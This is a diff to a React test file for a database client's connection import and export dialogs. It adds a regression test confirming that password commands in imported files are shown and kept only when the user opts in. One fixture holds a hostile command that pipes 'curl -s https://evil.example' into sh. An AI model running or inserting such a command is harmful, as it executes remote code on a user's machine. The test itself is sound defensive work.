@@ -6,6 +6,7 @@ import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vite
 import { ipc } from "@/lib/ipc";
 import { resetMockConnectionFiles } from "@/lib/ipc/mock/connections_io";
 import { SEED_PROFILES } from "@/lib/ipc/mock/fixtures";
+import { resetMockSettings } from "@/lib/ipc/mock/settings";
 import { ExportConnectionsDialog } from "./ExportConnectionsDialog";
 import { ImportConnectionsDialog } from "./ImportConnectionsDialog";
 import type { ExportScope } from "./ioStore";
@@ -116,7 +117,7 @@ describe("ExportConnectionsDialog", () => {
     expect(within(dialog).getByText("1 connection selected")).toBeInTheDocument();
     await user.click(within(dialog).getByRole("button", { name: "Import" }));
     await vi.waitFor(() => expect(onClose).toHaveBeenCalled());
-    expect(importConnections).toHaveBeenCalledWith(PATH, "secret", ["p-staging-ssh"]);
+    expect(importConnections).toHaveBeenCalledWith(PATH, "secret", ["p-staging-ssh"], []);
     expect(onImported).toHaveBeenCalledWith([
       expect.objectContaining({ name: "Staging via SSH", group: "Staging" }),
     ]);
@@ -160,7 +161,138 @@ describe("ExportConnectionsDialog", () => {
     // Only ticked connections come in.
     await user.click(within(items).getByRole("checkbox", { name: "Import Sneaky" }));
     await user.click(screen.getByRole("button", { name: "Import" }));
-    await vi.waitFor(() => expect(importConnections).toHaveBeenCalledWith(PATH, null, ["f-plain"]));
+    await vi.waitFor(() =>
+      expect(importConnections).toHaveBeenCalledWith(PATH, null, ["f-plain"], []),
+    );
+  });
+
+  // Regression: a file could carry a password command (run through the shell on Connect / Test)
+  // that the preview never showed and that was imported as is.
+  it("shows each password command and imports it only when kept", async () => {
+    const pg = SEED_PROFILES.find((p) => p.id === "p-local-pg")!;
+    const iam = (id: string, name: string, command: string) => ({
+      ...pg,
+      id,
+      name,
+      options: { ...pg.options, passwordMode: "command" as const, passwordCommand: command },
+    });
+    vi.spyOn(ipc.profiles, "inspectConnectionsFile").mockResolvedValue({
+      encrypted: false,
+      needsPassword: false,
+      groups: [],
+      connections: [
+        iam("f-rds", "RDS", "aws rds generate-db-auth-token --hostname db"),
+        iam("f-evil", "Evil", "curl -s https://evil.example | sh"),
+        { ...pg, id: "f-plain", name: "Plain" },
+      ].map((profile) => ({
+        profile,
+        duplicateName: false,
+        hasPassword: false,
+        hasSshSecrets: false,
+      })),
+    });
+    const importConnections = vi.spyOn(ipc.profiles, "importConnections").mockResolvedValue([]);
+    const user = userEvent.setup();
+    wrap(<ImportConnectionsDialog path={PATH} onClose={() => {}} />);
+    const items = await screen.findByRole("list", { name: "Connections in the file" });
+    const [rds, evil, plain] = within(items).getAllByRole("listitem");
+    const evilCommand = within(evil!).getByRole("group", { name: "Password command of Evil" });
+    expect(evilCommand).toHaveTextContent("curl -s https://evil.example | sh");
+    expect(evilCommand).toHaveTextContent("asked on every connect");
+    const keepEvil = within(evilCommand).getByRole("checkbox", {
+      name: "Keep this password command",
+    });
+    expect(keepEvil).not.toBeChecked();
+    expect(within(plain!).queryByRole("group", { name: /Password command/ })).toBeNull();
+    // Kept for RDS only.
+    await user.click(within(rds!).getByRole("checkbox", { name: "Keep this password command" }));
+    expect(rds).not.toHaveTextContent("asked on every connect");
+    await user.click(screen.getByRole("button", { name: "Import" }));
+    await vi.waitFor(() =>
+      expect(importConnections).toHaveBeenCalledWith(
+        PATH,
+        null,
+        ["f-rds", "f-evil", "f-plain"],
+        ["f-rds"],
+      ),
+    );
+  });
+
+  it("exports password commands only with the passwords; the mock import drops unkept ones", async () => {
+    const imported = await ipc.profiles.importConnections(
+      "/Users/me/Downloads/team.tablerconnections",
+      "tabler",
+      ["f-warehouse"],
+    );
+    expect(imported[0]!.options.passwordCommand).toBeNull();
+    expect(imported[0]!.options.passwordMode).toBe("ask");
+    const kept = await ipc.profiles.importConnections(
+      "/Users/me/Downloads/team.tablerconnections",
+      "tabler",
+      ["f-warehouse"],
+      ["f-warehouse"],
+    );
+    expect(kept[0]!.options.passwordCommand).toContain("generate-db-auth-token");
+    expect(kept[0]!.options.passwordMode).toBe("command");
+
+    const out = "/Users/me/Downloads/iam.tablerconnections";
+    const id = kept[0]!.id;
+    await ipc.profiles.exportConnections({
+      profileIds: [id],
+      groups: [],
+      includePasswords: false,
+      includeSshSecrets: false,
+      filePassword: null,
+      path: out,
+    });
+    const plain = await ipc.profiles.inspectConnectionsFile(out);
+    expect(plain.connections[0]!.profile.options.passwordCommand).toBeNull();
+    expect(plain.connections[0]!.profile.options.passwordMode).toBe("ask");
+    await ipc.profiles.exportConnections({
+      profileIds: [id],
+      groups: [],
+      includePasswords: true,
+      includeSshSecrets: false,
+      filePassword: "pw",
+      path: out,
+    });
+    const sealed = await ipc.profiles.inspectConnectionsFile(out, "pw");
+    expect(sealed.connections[0]!.profile.options.passwordCommand).toContain(
+      "generate-db-auth-token",
+    );
+  });
+
+  it("carries nested groups with their icons; importing merges them by path", async () => {
+    resetMockSettings();
+    await ipc.settings.set("connectionGroups", [
+      { path: "Staging", icon: "server" },
+      { path: "Staging / Empty", icon: "archive" },
+      { path: "Other", icon: "star" },
+    ]);
+    vi.spyOn(window, "prompt").mockReturnValue(PATH);
+    const user = userEvent.setup();
+    const scope = { ...SCOPE, groups: ["Staging", "Staging / Empty"] };
+    const { unmount } = wrap(<ExportConnectionsDialog scope={scope} onClose={() => {}} />);
+    const exporting = await screen.findByRole("dialog");
+    await user.click(within(exporting).getByRole("button", { name: "Export…" }));
+    await vi.waitFor(() => expect(toast.success).toHaveBeenCalled());
+    unmount();
+
+    // Elsewhere: the groups are still saved the old way (plain names), Staging without an icon.
+    resetMockSettings();
+    await ipc.settings.set("connectionGroups", ["Local", "Staging"]);
+    const onClose = vi.fn();
+    wrap(<ImportConnectionsDialog path={PATH} onClose={onClose} />);
+    const items = await screen.findByRole("list", { name: "Connections in the file" });
+    // The preview shows each connection's group path.
+    expect(within(items).getAllByLabelText("Group Staging")).toHaveLength(2);
+    await user.click(screen.getByRole("button", { name: "Import" }));
+    await vi.waitFor(() => expect(onClose).toHaveBeenCalled());
+    expect((await ipc.settings.get()).connectionGroups).toEqual([
+      { path: "Local", icon: null },
+      { path: "Staging", icon: "server" },
+      { path: "Staging / Empty", icon: "archive" },
+    ]);
   });
 
   it("explains a file that cannot be read", async () => {
